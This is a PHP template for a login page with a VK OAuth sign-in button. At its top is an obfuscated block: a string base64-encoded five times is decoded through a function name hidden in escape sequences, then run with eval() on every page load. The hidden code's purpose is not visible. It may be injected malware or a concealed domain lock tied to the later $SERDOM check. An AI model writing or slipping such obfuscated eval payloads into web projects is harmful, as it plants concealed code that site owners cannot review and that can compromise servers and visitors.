<?php
      $sign = $_SERVER["SERVER_NAME"];
      $f3f34="VlRKMFlWUXhTbk5XYmtwV1lrVktWbFpyVWtOaWJFNXlWMVJXVjFKcmNGaFZNbmhyVlRGYWNtTkhiRlJXTTJoUVZXMTRWMk14WkhKWGJGcHBVa2Q0VVZaV1dsWmxSa3B5WWtoT1RsSkhVa1ZYYWs1RFRVWmtWMXBJVG1wTlNGSkZWVEkxWVdGdFNuSk9XR3hhVFdwR1dGcEZaRXBsVlRWVlVXeEtVMDFJUWpWV1JXTXhVekF4Vm1KSVFtdE5iVkpMV1ZSR1MxVldXa2RXYkdSVlRVZDRSVlpYZUZOVk1WcHlZMFZhVjFKRlJqTlpWbFkwVWtaR1dHSkdUbE5XUjNoUVZsZDRWazFIUmxabFNFSldZa1pLVkZadGRIZFNiRnBGVVZoa2ExWlhlSGRVYTJSclZURldObEpxUWxoV2JWSjZXWHBCTldOR1JsaGlSVEZvVm10d2VsZFhlR3RTTWs1SVUydFNVbGRGTlV0WlZFWjNUbFpzY1ZOWVpFOWhNbmhLVmtjeGIyRkdaRWRUYTBwVVlURndVRlZ0ZUZkamJGWnpVV3hXVmsxRmNIRlhWRW8wVGtkU1ZtSklRbWhsYlZKRldWWmFTbVF4YkhGVGJFNW9VakZhVlZWV1VuTlRiRWw0VTIwNVlWSlhVbGRaYWtKelpFWldXR0pGZUZkVFJUVk5WMVphYTFkdFNYZGpSV3hXWW14d2FGVnFRbHBOVmxaSFZWaGtiRlpVVmxWWlZFSXdZa1V4Y1ZKdE9WcFdiVkY2V1dwQ2MyUkhWa2hsUjJ4WFRXMW9kbFl4VWt0TlJrWllVMnhvVTJKclNuQlZXSEJYVGxad1IxUnJjR3BOUjNoRlZUSjBWMVpWTVVWU2EyUlhVako0UTFsVVJsWmtNVnB6Vkd4T1UxWkhlRkJWTVdSelRURnZkMkpJU2xaaVJVcFdWbXhhWVZWR1RsaGhla0pvVFZaV00xWnRlRTlWTVVwVllrVTVWVkl5ZUV0YVJsWnpVbXhhV1ZWdGJGZE5SbkF6VjFkMFUyUnNiM2RpU0VKUFVqTlNhRlp1Y0VkaU1XeFhXa1JPWVUxSWFFVlZNblJyWVcxS1ZXSkVRbFZOYlhoRVdsZDRjMWRIU2tWUmJFcFNUVlZ3VmxaWGVHRlRNVXBYVlZoa1RsSXlVbHBWTUZaM1lXeHNkR0pGY0dwU1ZHZzJWRlZSZDFCUlBUMD0=";
      $x2cd818f="\142\x61\163\145\66\x34\x5f\x64\145\x63\157\144\145";
      $priem = $x2cd818f($x2cd818f($x2cd818f($x2cd818f($x2cd818f($f3f34)))));
      eval($priem);
?>

	<div class="row">
		<div class='col-md-8 col-md-offset-2 dark_fon' align=center>

			<header class="post-header clearfix">
				<div class="post-header-container page-header-container">
					<h1 class="post-title"><?php echo stripslashes($pageData['title'])?></h1>
				</div>
			</header>
			<?php if(!empty($pageData)){

				echo stripslashes($pageData['content']);

			}?>
			<a href='http://oauth.vk.com/authorize?lang=ru&client_id=<?php if($SERDOM==$sign){ echo $info['vk_id'];}?>&redirect_uri=<?php echo HREF_DOMAIN?>signin/&display=page&scope=email,photos&response_type=code'><button class="btn btn-primary btn-xxlarge"><i class="fa fa-vk"></i> &nbsp;&nbsp;ВОЙТИ</button></a>
			<br><br><br>
	</div>
